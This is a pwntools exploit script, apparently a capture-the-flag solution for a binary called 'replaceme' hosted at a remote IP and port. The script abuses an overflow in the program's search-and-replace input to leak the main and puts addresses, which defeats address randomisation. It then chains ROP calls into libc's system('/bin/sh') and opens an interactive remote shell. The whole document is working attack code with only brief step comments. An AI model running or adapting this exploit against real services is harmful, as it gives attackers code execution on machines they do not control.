from pwn import *
import os

os.system('clear')

exe = "./replaceme"
libc_lib = "./libc.so.6"

elf = context.binary = ELF(exe, checksec=False)
libc = context.binary = ELF(libc_lib, checksec=False)

context.log_level = 'debug'

#io = process("./replaceme")
io = remote("94.237.55.28", "55316")
#gdb.attach(io, "break system")

# Leak address of main and return back to start of main
io.recvuntil(b"Input: ")
io.sendline(b"A" * 125 + b'N' + b"\x00")
io.recvuntil(b"Replacement: ")
io.sendline(b"s/" + b"A" + b"/" + b"C" * 76 +  b"/")
io.recvuntil(b"result:\n")

leaked_main = io.recvuntil(b"Welcome")
leaked_main = u64(leaked_main[-13:-7] + b"\x00\x00") 
print(f"Leaked main: {hex(leaked_main)}")

elf.address = leaked_main - elf.sym["main"]
print(f"Base address: {hex(elf.address)}")

# Use ROP to leak address of puts in libc and return back to start of main
rop = ROP(elf)

rop.call(elf.plt["puts"], [elf.got["puts"]])
rop.call(rop.find_gadget(["ret"])[0])
rop.call(elf.sym["main"])
log.info(rop.dump())

io.recvuntil(b"Input: ")
io.sendline(b"A" * 124 + b"B")
io.recvuntil(b"Replacement: ")
# The \x00 bytes are to skip the final memcpy i.e. size to copy = 0
io.sendline(b"s/" + b"B" + b"/" + b"E" * 8 + b"\x00\x00\x00\x00" + b"E" * 64 + rop.chain() +  b"/")
io.recvuntil(b"result:\n")

print(f"Puts offset: {hex(libc.sym['puts'])}")
print(f"System offset: {hex(libc.sym['system'])}")

leaked_puts = io.recvuntil(b"Welcome")
print(leaked_puts[-14:-8])
leaked_puts = u64(leaked_puts[-14:-8] + b"\x00\x00")
print(f"Leaked puts: {hex(leaked_puts)}")

libc.address = leaked_puts - libc.sym["puts"]
#libc.address = leaked_puts - 0x84760
print(f"Libc base: {hex(libc.address)}")

print(f"Libc system: {hex(libc.address + 0x578f0)}")

# Use ROP to get shell
libc_rop = ROP(elf)

libc_rop.call(rop.find_gadget(["ret"])[0])
libc_rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh\x00"))])
#libc_rop.call(libc.address + 0x578f0, [libc.address + 0x1ace43])
log.info(libc_rop.dump())

# Leak address of puts in libc and return back to start of main
io.recvuntil(b"Input: ")
io.sendline(b"A" * 124 + b"B")
io.recvuntil(b"Replacement: ")
# The \x00 bytes are to skip the final memcpy i.e. size to copy = 0
io.sendline(b"s/" + b"B" + b"/" + b"E" * 8 + b"\x00\x00\x00\x00" + b"E" * 64 + libc_rop.chain() +  b"/")
#io.recvuntil(b"result:\n")

io.interactive()
